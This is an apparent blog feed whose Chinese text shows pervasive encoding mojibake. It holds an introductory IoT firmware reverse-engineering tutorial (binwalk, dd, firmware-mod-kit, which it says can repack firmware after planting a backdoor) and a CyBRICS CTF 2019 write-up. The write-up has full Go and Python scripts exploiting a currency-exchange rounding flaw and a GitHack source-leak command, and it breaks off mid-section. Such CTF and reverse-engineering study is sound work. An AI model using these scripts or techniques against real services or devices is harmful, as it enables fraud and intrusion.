alt="B10BD5C0-8820-49A2-ABC1-EA4BF20150C0.png"></p><p>ä¹‹åä½¿ç”¨ä½¿ç”¨<code>file</code>å‘½ä»¤æ¥è¯†åˆ«æ–‡ä»¶ç±»å‹ï¼Œæ­¤å¤„è¯†åˆ«åå‘ç°ç›®æ ‡æ˜¯æ•°æ®ç±»æ–‡ä»¶<br><img src="https://i.loli.net/2019/08/15/S3qQ4kJAwXdsjUO.png" alt="CD422AAB-9C09-46DD-BD27-C56273444ADB.png"></p><p>æ—¢ç„¶æ˜¯æ•°æ®æ–‡ä»¶æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨<code>hexdump</code>å’Œ<code>string</code>æ¥å¯¹å…¶ä¸­çš„ä¿¡æ¯è¿›è¡Œåˆ†æï¼Œä½œä¸ºåˆå§‹çš„ä¿¡æ¯æ”¶é›†è¿‡ç¨‹ã€‚<br>PS: </p><ol><li>å› ä¸ºä¸€èˆ¬è¾“å‡ºçš„ä¿¡æ¯éå¸¸å¤šï¼Œæ‰€ä»¥æ­¤å¤„å°†è¾“å‡ºçš„ä¿¡æ¯å¯¼å…¥è¾“å‡ºæ–‡ä»¶ï¼Œæ–¹ä¾¿éšåæŸ¥çœ‹ã€‚</li><li>hexdump -C å‚æ•°å¯ä»¥è®¾ç½®è¾“å‡ºä¸ºhex+ASCIIçš„æ–¹å¼ã€‚</li></ol><p><img src="https://i.loli.net/2019/08/15/7WlOTnQR8AyNdMx.png" alt="9A44A5CB-CAA3-462C-A15A-7EB5A423E0DF.png"></p><p>ä¹‹åå°±å¯ä»¥åœ¨æ–‡ä»¶ä¸­æœç´¢è‡ªå·±æƒ³è¦çš„ä¿¡æ¯ï¼Œæ¯”å¦‚æœç´¢ä¸€ä¸‹æ–‡ä»¶ç³»ç»Ÿå¸¸ç”¨çš„boot loaderåå­—u-bootï¼Œå°±å¯ä»¥åœ¨æ–‡ä»¶ä¸­çœ‹åˆ°ç›¸å…³ä¿¡æ¯ã€‚<br><img src="https://i.loli.net/2019/08/15/kbNPFCHh5A4sqmd.png" alt="C8AB21C5-BC26-46F7-9A50-AC6A099BC222.png"></p><p>ä¹‹åå¯ä»¥ä½¿ç”¨<code>binwalk</code>æ¥å¯¹ç›®æ ‡è¿›è¡Œåˆ†æã€‚åˆ†æç»“æœä¸»è¦åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†è¿›è¡Œå±•ç¤ºï¼šæ–‡ä»¶åœ°å€çš„åè¿›åˆ¶å’Œåå…­è¿›åˆ¶å±•ç¤ºä»¥åŠå¯¹åº”ä½ç½®å‘ç°çš„è¯¦ç»†æè¿°ã€‚ä»åˆ†æç»“æœä¸­ä¹Ÿå¯ä»¥ç¡®è®¤æ­¤å¤„ä½¿ç”¨çš„boot loaderå°±æ˜¯U-bootã€‚<br><img src="https://i.loli.net/2019/08/15/R7yL2DPpV4rg6Nx.png" alt="21E84A59-EB8C-4469-BA57-8C5E1F1706A2.png"></p><p>åˆ†æå®Œä¹‹åå¯ä»¥ä½¿ç”¨<code>binwalk -e</code>æ¥å¯¹å›ºä»¶çš„å„ä¸ªéƒ¨åˆ†è¿›è¡Œæå–ã€‚æå–å®Œæˆåå°±å¯ä»¥è¿›å…¥æ–‡ä»¶ç³»ç»Ÿè·å–è‡ªå·±æƒ³è¦çš„ä¿¡æ¯äº†ï¼Œæ¯”å¦‚æˆ‘åªå…³æ³¨webé¡µé¢çš„æºç æ–‡ä»¶ï¼Œé‚£ä¹ˆå°±è¿›å…¥<code>squashfs-root/web</code>ã€‚<br><img src="https://i.loli.net/2019/08/15/hUH1M6XyCNT8zWr.png" alt="1A6B56C2-CA38-4618-8B35-4DFB05F9A6F2.png"></p><p>PS: binwalkå…¶å®ƒçš„å¸¸ç”¨å‚æ•°<br>-Mï¼šé€’å½’æ‰«ææå–çš„æ–‡ä»¶<br>-rï¼šæå–ååˆ é™¤å‰©ä½™æ–‡ä»¶<br>-eï¼šè‡ªåŠ¨æå–å·²çŸ¥æ–‡ä»¶ç±»å‹<br>æ‰€ä»¥ä¸€èˆ¬ä¼šä½¿ç”¨<code>binwalk -Mre file.bin</code>æ¥æå–å›ºä»¶ä¸­çš„ä¿¡æ¯ã€‚</p><p>å½“ç„¶æ­¤å¤„ä¹Ÿå¯ä»¥ä½¿ç”¨<code>dd</code>å‘½ä»¤æ¥å¯¹ç‰¹å®šä½ç½®çš„æ–‡ä»¶æ¥æå–</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=TL-WR841Nv14_EU_0.9.1_4.16_up_boot\[180319-rel57291\].bin skip=1049088 bs=1 of=TP.sfs</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/15/v4OMKBoNeczHWE1.png" alt="B25D6B9F-1B47-42F0-8BAC-1B630954E8E0.png"><br>PS: </p><ol><li><code>dd</code> å¯ä»¥è·¨æ–‡ä»¶ã€è®¾å¤‡ã€åˆ†åŒºå’Œå·å¤åˆ¶æ•°æ®</li><li><code>if</code> æ ‡å‡†æ–‡ä»¶è¾“å…¥</li><li><code>of</code> æ ‡å‡†æ–‡ä»¶è¾“å‡º</li><li><code>bs</code> å—å¤§å°</li><li><code>skip</code>ç”¨äºè·³è¿‡æŒ‡å‘å›ºä»¶äºŒè¿›åˆ¶æ˜ åƒä¸­ç‰¹å®šåœ°å€çš„æŒ‡é’ˆ</li></ol><p>æœ€ç»ˆå¾—åˆ°<code>dd</code>å‘½ä»¤åˆ†å‰²ä¹‹åçš„æ–‡ä»¶<code>TP.sfs</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªå­˜å‚¨<code>Squashfs</code>æ–‡ä»¶ç³»ç»Ÿçš„æ–‡ä»¶ã€‚ä¹‹åå¯ä»¥ä½¿ç”¨<code>unsquashfs</code>å·¥å…·æ¥å¯¹å…¶ä¸­çš„æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œæå–ã€‚æå–å®Œæˆåä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ª<code>squashfs-root</code>æ–‡ä»¶å¤¹ã€‚<br><img src="https://i.loli.net/2019/08/15/N9hKyCWLUTtM85k.png" alt="A08A2109-0C9F-4C3E-86FA-A23D0A678977.png"></p><p>æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨Googleå‡ºçš„firmware-mod-kitæ¥å®Œæˆå¯¹å›ºä»¶çš„è§£åŒ…å’Œæ‰“åŒ…ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å¾ˆæ–¹ä¾¿çš„åœ¨å¯¹ç›®æ ‡å®Œæˆä¿®æ”¹åé‡æ–°æ‰“åŒ…å›ºä»¶ï¼ˆæ¯”å¦‚æ¤å…¥åé—¨ä¹‹åé‡æ–°æ‰“åŒ…ï¼‰ã€‚<br>PS: Googleå·²ç»ä¸å¯¹è¿™ä¸ªå·¥å…·è¿›è¡Œæ›´æ–°ï¼Œåœ¨æœ€æ–°çš„ç³»ç»Ÿä¸Šç¼–è¯‘å¯èƒ½ä¼šå‡ºç°é—®é¢˜ï¼Œæ‰€ä»¥æ¨èä»¥ä¸‹ä¸¤ä¸ªç¬¬ä¸‰æ–¹ä¿®æ”¹ç‰ˆã€‚<br>é€‚ç”¨äºLinux: <a href="https://github.com/rampageX/firmware-mod-kit" target="_blank" rel="noopener">https://github.com/rampageX/firmware-mod-kit</a><br>é€‚ç”¨äºmacOS: <a href="https://github.com/cinquemb/firmware-mod-kit-osx" target="_blank" rel="noopener">https://github.com/cinquemb/firmware-mod-kit-osx</a><br>è§£åŒ…æ“ä½œå¦‚ä¸‹æ‰€ç¤º<br><img src="https://i.loli.net/2019/08/15/jR76ACzO9EuFe2c.png" alt="EA859A97-35DE-4C7D-8013-C6F4F07FB24B.png"><br>é‡å»ºå›ºä»¶åŒ…å¦‚ä¸‹æ‰€ç¤º<br><img src="https://i.loli.net/2019/08/15/lxCqDMjnITHvzYE.png" alt="FAAC8614-47CF-41F6-BD2A-293E3AAAC0F7.png"></p><p>åˆ°æ­¤ä¸ºæ­¢ï¼Œæˆ‘ä»¬å·²ç»æå–äº†å›ºä»¶çš„æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥å¼€å§‹åˆ†ææ–‡ä»¶ç³»ç»Ÿä¸­å­˜åœ¨çš„äºŒè¿›åˆ¶æ–‡ä»¶æˆ–è€…æŸäº›æ–‡ä»¶äº†ã€‚</p><p>åˆ†ææ–‡ä»¶çš„è¯ä¸€èˆ¬æ˜¯å…ˆçœ‹<code>etc</code>ç›®å½•ä¸‹çš„é…ç½®æ–‡ä»¶å’Œå¯åŠ¨è„šæœ¬<br><img src="https://i.loli.net/2019/08/15/rwylY95RsaLoQj7.png" alt="B4DD20FF-8797-4633-9540-C1F57C2D2700.png"><br>æ¯”å¦‚è¯´æ­¤å¤„å¯ä»¥çœ‹åˆ°ä¸€ä¸ªpasswdæ–‡ä»¶å’Œinit.dæ–‡ä»¶å¤¹ï¼Œinit.dæ–‡ä»¶å¤¹ä¸‹å­˜å‚¨çš„æ˜¯å¯åŠ¨çš„æ—¶å€™åˆå§‹åŒ–æœåŠ¡å’Œç¯å¢ƒrcSæ–‡ä»¶ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹æ–‡ä»¶çš„å†…å®¹ã€‚<br><img src="https://i.loli.net/2019/08/15/l3ToSLJOeia69Fu.png" alt="909A5DC6-5F72-467D-92E5-24F1C12F7C25.png"><br>å¯ä»¥çœ‹åˆ°å¯åŠ¨çš„æ—¶å€™å°†<code>cp -p /etc/passwd.bak /var/passwd</code>ï¼Œå†çœ‹<code>passwd.bak</code>æ–‡ä»¶å°±å¯ä»¥å¾—åˆ°ä¸€äº›é»˜è®¤å£ä»¤<br><img src="https://i.loli.net/2019/08/15/7ztHWvsGeiSK8Xb.png" alt="4CB3F00A-6E9D-4120-BCC3-F038026F0988.png"></p><p>ä¹‹ååœ¨binç›®å½•ä¸‹çœ‹åˆ°<code>login</code>æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨IDAæ¥å¯¹è¿™ä¸ªæ–‡ä»¶çš„ç™»å½•é€»è¾‘è¿›è¡Œåˆ†æï¼Œå¯èƒ½å­˜åœ¨ç™»å½•ç»•è¿‡æˆ–è€…å‘½ä»¤æ³¨å…¥ç­‰æ¼æ´ã€‚</p><p><img src="https://i.loli.net/2019/08/15/xRJOp6InTN5Lvmb.png" alt="6E87135C-D407-4D8E-AD80-DE25BBED2EA3.png"></p><p>ä¸è¿‡å†å¯¹mipsæŒ‡ä»¤é›†çš„åˆ†æä¸Šghidraæ›´å¥½ä¸€äº›<br><img src="https://i.loli.net/2019/08/15/jfi6T8nJeFt2DhW.png" alt="1C720AAD-26F9-492A-AFDD-E00F3B91F2EB.png"></p><h2 id="0x04-trick"><a href="#0x04-trick" class="headerlink" title="0x04 trick"></a>0x04 trick</h2><ol><li>åœ¨æ•´ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ä¸­æœç´¢å­—ç¬¦ä¸²<br>å‚æ•°<code>izz | more</code><br><img src="https://i.loli.net/2019/08/15/eJlpzdSnKgACO5Y.png" alt="47BCD0CA-59D7-4A3E-806A-1A5346F7BCB4.png"></li><li>ä½¿ç”¨firmwalkeræ‰«ææ•æ„Ÿæ–‡ä»¶<br><img src="https://i.loli.net/2019/08/15/mjLT1aRCBihfyuQ.png" alt="98B7ADDE-2020-44AA-AFB2-AB437AF3E899.png"></li><li>ä½¿ç”¨Firmware Slapæ‰«ææ¼æ´</li></ol><h2 id="0x05-æ€»ç»“"><a href="#0x05-æ€»ç»“" class="headerlink" title="0x05 æ€»ç»“"></a>0x05 æ€»ç»“</h2><p>æ–‡ç« å¯¹ç›®å‰å¸¸ç”¨çš„å›ºä»¶åˆ†æå·¥å…·ä»¥åŠå›ºä»¶çš„åˆ†ææµç¨‹åšäº†ç®€å•çš„ä»‹ç»ï¼Œä½œä¸ºä¸€ç¯‡å…¥é—¨çº§åˆ«çš„æ–‡ç« ã€‚</p><h2 id="0x06-å‚è€ƒ"><a href="#0x06-å‚è€ƒ" class="headerlink" title="0x06 å‚è€ƒ"></a>0x06 å‚è€ƒ</h2><p><a href="http://blog.securelayer7.net/how-to-start-iot-device-firmware-reverse-engineering/" target="_blank" rel="noopener">ã€ŠHow to Start IoT device Firmware Reverse Engineering?ã€‹</a><br><a href="https://yq.aliyun.com/articles/572095" target="_blank" rel="noopener">ã€Šé€†å‘è·¯ç”±å™¨å›ºä»¶ä¹‹è§£åŒ… Part1ã€‹</a><br><a href="https://www.zkaq.org/?t/1815.html" target="_blank" rel="noopener">ã€ŠIOTæ¸—é€æµ‹è¯•ã€‹</a><br><a href="http://xdxd.love/2015/08/24/%E9%80%86%E5%90%91%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E4%B9%8B%E4%BA%8C/" target="_blank" rel="noopener">ã€Šé€†å‘è·¯ç”±å™¨å›ºä»¶ä¹‹ä¿¡æ¯æ³„éœ²ã€‹</a><br><a href="http://www.atomsec.org/%e5%ae%89%e5%85%a8/multiple-d-link-authentication-bypass-vulnerabilities/" target="_blank" rel="noopener">ã€ŠMultiple D-Link Authentication Bypass Vulnerabilitiesã€‹</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h2&gt;&lt;p&gt;ä¸€ç¯‡å…¥é—¨çº§åˆ«çš„IoTå›ºä»¶é€†å‘æ–‡ç« &lt;/p&gt;
&lt;h2 id=&quot;0x01-å›ºä»¶ä¸‹è½½&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CyBRICS CTF 2019 WriteUp</title>
    <link href="http://zer0yu.github.io/2019/08/11/CyBRICS-CTF-2019-WriteUp/"/>
    <id>http://zer0yu.github.io/2019/08/11/CyBRICS-CTF-2019-WriteUp/</id>
    <published>2019-08-11T11:11:26.000Z</published>
    <updated>2019-08-11T11:15:10.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>åˆæ˜¯æ‘¸é±¼çš„ä¸€å¤©</p><h2 id="0x01-Bitkoff-Bank-Web-Easy-50-pts"><a href="#0x01-Bitkoff-Bank-Web-Easy-50-pts" class="headerlink" title="0x01 Bitkoff Bank (Web, Easy, 50 pts)"></a>0x01 Bitkoff Bank (Web, Easy, 50 pts)</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>Author: Alexander Menshchikov (n0str)</p><p>Need more money! Need the flag!</p><h3 id="é¢˜ç›®è§£ç­”"><a href="#é¢˜ç›®è§£ç­”" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h3><p>æ–¹æ³•ä¸€ï¼šè€—æ—¶è¾ƒé•¿ä½†æ˜¯æ“ä½œç®€å•</p><ol><li>å°†btcå…‘æ¢ä¸ºusd</li><li>è´­ä¹°è‡ªåŠ¨æŒ–btcçš„æœºå™¨äºº</li><li>burpå¤šçº¿ç¨‹è·Ÿç€æŒ–</li></ol><p>å‡ ä¸ªå°æ—¶ä¹‹åå°±å¯ä»¥å¾—åˆ°flagäº†ã€‚&lt;â€“æˆ‘çš„è§£æ³• (x_x)</p><p>æ–¹æ³•äºŒï¼šé€»è¾‘å…‘æ¢é—®é¢˜</p><ol><li>btc-&gt;usd</li><li>usd-&gt;btc</li></ol><p>è¿™ä¸ªæµç¨‹èµ°å®Œä¼šå‘ç°btcå°±å˜å¤šäº†ï¼Œè¿™æ ·å…‘æ¢ä¸ªå‡ ç™¾æ¬¡å°±å¯ä»¥å¾—åˆ°flagã€‚</p><p>ä¹‹æ‰€ä»¥ä¼šæƒ³åˆ°è¿™ç‚¹ï¼š</p><ol><li>å°è¯•å…‘æ¢</li><li>å‰ç«¯æç¤ºäº†å¯¹æµ®ç‚¹æ•°çš„å¤„ç†ï¼Œä½†æ˜¯åç«¯å¹¶æ²¡æœ‰å¯¹å…¶è¿›è¡Œé™åˆ¶ã€‚</li></ol><p>åˆ«çš„å¸ˆå‚…çš„è§£æ³•â€“&gt;</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"io/ioutil"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line"><span class="string">"regexp"</span></span><br><span class="line"><span class="string">"strings"</span></span><br><span class="line"><span class="string">"sync"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> url = <span class="string">"http://95.179.148.72:8083/index.php"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"><span class="keyword">go</span> btc2usd(<span class="string">"0.00009"</span>, <span class="literal">true</span>)</span><br><span class="line"><span class="keyword">for</span> j:=<span class="number">0</span>; j &lt; <span class="number">100</span>; j++ &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">1</span>; i++ &#123;</span><br><span class="line"><span class="keyword">go</span> usd2btc(<span class="string">"0.9"</span>, &amp;wg)</span><br><span class="line">&#125;</span><br><span class="line">wg.Wait()</span><br><span class="line">_, b := getmoney()</span><br><span class="line">btc2usd(b, <span class="literal">false</span>)</span><br><span class="line">fmt.Println(getmoney())</span><br><span class="line">&#125;</span><br><span class="line">_, b := getmoney()</span><br><span class="line">btc2usd(b, <span class="literal">false</span>)</span><br><span class="line">fmt.Println(getmoney())</span><br><span class="line">fmt.Println(<span class="string">"done"</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getmoney</span><span class="params">()</span> <span class="params">(<span class="keyword">string</span>, <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">client := &amp;http.Client&#123;&#125;</span><br><span class="line">req,_ := http.NewRequest(<span class="string">"POST"</span>,url,strings.NewReader(<span class="string">""</span>))</span><br><span class="line">req.Header.Set(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>)</span><br><span class="line">req.Header.Set(<span class="string">"Cookie"</span>,<span class="string">"name=catcat; password=catcat"</span>)</span><br><span class="line">resp2, _ := client.Do(req)</span><br><span class="line">body, _ := ioutil.ReadAll(resp2.Body)</span><br><span class="line">r := regexp.MustCompile(<span class="string">"Your USD: &lt;b&gt;(.*)&lt;/b&gt;&lt;br&gt;Your"</span>)</span><br><span class="line">usd := r.FindStringSubmatch(<span class="keyword">string</span>(body))[<span class="number">1</span>]</span><br><span class="line">r = regexp.MustCompile(<span class="string">"&gt;Your BTC: &lt;b&gt;(.*)&lt;/b&gt;&lt;br&gt;"</span>)</span><br><span class="line">btc := r.FindStringSubmatch(<span class="keyword">string</span>(body))[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">return</span> usd, btc</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">btc2usd</span><span class="params">(amount <span class="keyword">string</span>, l <span class="keyword">bool</span>)</span></span> &#123;</span><br><span class="line">client := &amp;http.Client&#123;&#125;</span><br><span class="line">req,_ := http.NewRequest(<span class="string">"POST"</span>,url,strings.NewReader(<span class="string">"from_currency=btc&amp;to_currency=usd&amp;amount="</span>+amount))</span><br><span class="line">req.Header.Set(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>)</span><br><span class="line">req.Header.Set(<span class="string">"Cookie"</span>,<span class="string">"name=catcat; password=catcat"</span>)</span><br><span class="line"><span class="keyword">if</span> l == <span class="literal">true</span> &#123;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">client.Do(req)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">client.Do(req)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">usd2btc</span><span class="params">(amount <span class="keyword">string</span>, wg *sync.WaitGroup)</span></span> &#123;</span><br><span class="line">wg.Add(<span class="number">1</span>)</span><br><span class="line">client := &amp;http.Client&#123;&#125;</span><br><span class="line">req,_ := http.NewRequest(<span class="string">"POST"</span>,url,strings.NewReader(<span class="string">"from_currency=usd&amp;to_currency=btc&amp;amount="</span>+amount))</span><br><span class="line">req.Header.Set(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>)</span><br><span class="line">req.Header.Set(<span class="string">"Cookie"</span>,<span class="string">"name=catcat; password=catcat"</span>)</span><br><span class="line">client.Do(req)</span><br><span class="line">wg.Done()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://95.179.148.72:8083/index.php'</span></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randstr</span><span class="params">(length=<span class="number">8</span>)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(random.sample(string.ascii_letters + string.digits, length))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(s,url)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=s.get(url,timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">if</span> r.status_code != <span class="number">500</span>:</span><br><span class="line">                <span class="keyword">return</span> r</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(s,url,data)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=s.post(url,data=data,timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">if</span> r.status_code != <span class="number">500</span>:</span><br><span class="line">                <span class="keyword">return</span> r</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg_login</span><span class="params">(s,url,un,pw)</span>:</span></span><br><span class="line">    payload=&#123;<span class="string">'name'</span>:un,<span class="string">'password'</span>:pw&#125;</span><br><span class="line">    r=post(s,url,payload)</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(s,url,fr,to,am)</span>:</span></span><br><span class="line">    payload=&#123;<span class="string">'from_currency'</span>:fr,<span class="string">'to_currency'</span>:to,<span class="string">'amount'</span>:am&#125;</span><br><span class="line">    r=post(s,url,payload)</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line">un=randstr()</span><br><span class="line">pw=randstr()</span><br><span class="line"><span class="keyword">print</span> un</span><br><span class="line"><span class="keyword">print</span> pw</span><br><span class="line">reg_login(s,url,un,pw)</span><br><span class="line">reg_login(s,url,un,pw)</span><br><span class="line">change(s,url,<span class="string">'btc'</span>,<span class="string">'usd'</span>,<span class="string">'0.00003'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    res=get(s,url)</span><br><span class="line">    usd=res.text.split(<span class="string">': &lt;b&gt;'</span>)[<span class="number">1</span>].split(<span class="string">'&lt;/b&gt;'</span>)[<span class="number">0</span>]</span><br><span class="line">    btc=res.text.split(<span class="string">': &lt;b&gt;'</span>)[<span class="number">2</span>].split(<span class="string">'&lt;/b&gt;'</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">print</span> float(usd)</span><br><span class="line">    <span class="keyword">if</span> float(usd)&gt;=<span class="number">1.0</span>: <span class="keyword">break</span></span><br><span class="line">    change(s,url,<span class="string">'usd'</span>,<span class="string">'btc'</span>,usd)</span><br><span class="line">    res=get(s,url)</span><br><span class="line">    usd=res.text.split(<span class="string">': &lt;b&gt;'</span>)[<span class="number">1</span>].split(<span class="string">'&lt;/b&gt;'</span>)[<span class="number">0</span>]</span><br><span class="line">    btc=res.text.split(<span class="string">': &lt;b&gt;'</span>)[<span class="number">2</span>].split(<span class="string">'&lt;/b&gt;'</span>)[<span class="number">0</span>]</span><br><span class="line">    change(s,url,<span class="string">'btc'</span>,<span class="string">'usd'</span>,btc)</span><br></pre></td></tr></table></figure><p>flag:cybrics{50_57R4n93_pR3c1510n} </p><h2 id="0x02-NopeSQL-Web-Medium-156-pts"><a href="#0x02-NopeSQL-Web-Medium-156-pts" class="headerlink" title="0x02 NopeSQL (Web, Medium, 156 pts)"></a>0x02 NopeSQL (Web, Medium, 156 pts)</h2><h3 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>Author: Alexander Menshchikov (n0str)</p><p>Maybe you can login and find unusual secret news</p><p><a href="http://173.199.118.226/" target="_blank" rel="noopener">http://173.199.118.226/</a></p><h3 id="é¢˜ç›®è§£ç­”-1"><a href="#é¢˜ç›®è§£ç­”-1" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h3><ol><li>gitæ³„éœ²æºç ï¼ˆå‡çš„404ï¼‰</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://173.199.118.226/.git/</span><br></pre></td></tr></table></figure><figure class="highlight 